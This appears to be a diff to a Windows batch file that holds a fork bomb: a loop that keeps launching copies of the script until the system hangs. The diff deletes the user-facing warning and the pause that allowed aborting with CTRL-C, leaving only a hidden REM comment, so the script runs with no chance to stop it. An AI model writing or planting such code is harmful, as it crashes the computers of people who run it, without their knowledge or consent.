@@ -1,5 +1,6 @@
-echo Program will destroy computer. Press CTRL-C NOW to stop execution.
-pause
+REM THIS WILL DESTROY YOUR COMPUTER!
 :1
+
 start %~dp0\START1.BAT
+
 goto 1
